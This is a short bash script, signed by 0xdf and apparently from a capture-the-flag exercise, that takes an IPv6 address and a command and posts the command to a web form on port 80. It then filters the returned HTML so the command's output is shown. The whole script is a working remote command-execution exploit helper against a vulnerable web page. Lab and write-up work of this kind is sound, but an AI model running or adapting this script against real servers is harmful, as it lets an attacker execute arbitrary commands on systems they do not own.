#!/bin/bash

ip=$1
cmd=$2

curl -s -6 -X POST "http://[${ip}]:80/" -d "command=${cmd};" | grep -F "</html>" -A 10 | grep -vF -e "</html>" -e "Command was executed succesfully!"

#by 0xdf
